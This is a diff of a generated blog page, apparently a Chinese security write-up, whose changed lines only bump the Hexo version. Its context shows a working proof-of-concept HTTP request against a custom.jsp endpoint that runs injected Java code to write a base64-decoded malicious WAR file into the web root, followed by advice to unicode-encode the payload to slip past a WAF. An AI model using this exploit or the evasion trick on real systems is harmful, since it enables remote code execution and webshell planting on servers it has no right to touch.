@@ -71,7 +71,7 @@
   </script>
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.2.0"></head>
+<meta name="generator" content="Hexo 5.3.0"></head>
 
 
 <body>
@@ -282,7 +282,6 @@
 <figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1<br>Cache-Control: no-cache<br>Pragma: no-cache<br>User-Agent: Java/1.8.0_241<br>Host: 0.0.0.0<br>Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2<br>Connection: keep-alive<br>Content-type: application/x-www-form-urlencoded<br>Content-Length: <br><br>var=&#123;<span class="hljs-string">&quot;body&quot;</span>:&#123;<span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-string">&quot;/sys/common/dataxml.jsp&quot;</span>&#125;&#125;&amp;s_bean=sysFormulaValidate&amp;script=import+java.lang.*;import+java.io.*;Class+cls=Thread.currentThread().getContextClassLoader().loadClass(<span class="hljs-string">&quot;bsh.Interpreter&quot;</span>);String+path=cls.getProtectionDomain().getCodeSource().getLocation().getPath();File+f=new+File(path.split(<span class="hljs-string">&quot;WEB-INF&quot;</span>)[0]+<span class="hljs-string">&quot;../evilWar.war&quot;</span>);//这里写war项目f.createNewFile();FileOutputStream+fout=new+FileOutputStream(f);fout.write(new+sun.misc.BASE64Decoder().decodeBuffer(<span class="hljs-string">&quot;base64编码后的恶意的war包&quot;</span>));fout.close;&amp;<span class="hljs-built_in">type</span>=int&amp;modelName=<span class="hljs-built_in">test</span><br></code></pre></div></td></tr></table></figure>
 <p>如果waf拦截，可以将代码转为unicode</p>
 <figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">import java.lang.*;import java.io.*;Class cls=Thread.currentThread().getContextClassLoader().loadClass(<span class="hljs-string">&quot;bsh.Interpreter&quot;</span>);String path=cls.getProtectionDomain().getCodeSource().getLocation().getPath();File f=new File(path.split(<span class="hljs-string">&quot;WEB-INF&quot;</span>)[0]+<span class="hljs-string">&quot;../yourproject.war&quot;</span>);f.createNewFile();FileOutputStream fout=new FileOutputStream(f);fout.write(new sun.misc.BASE64Decoder().decodeBuffer<br></code></pre></div></td></tr></table></figure>
-
 
 <p><img src="/images/82/2GZtMuY6DFjy8jvP659rrKH3OgRKjRTN1ziFcWh1Mk0.png" srcset="/img/loading.gif" lazyload alt="image"></p>
 <p>发送完整poc：</p>
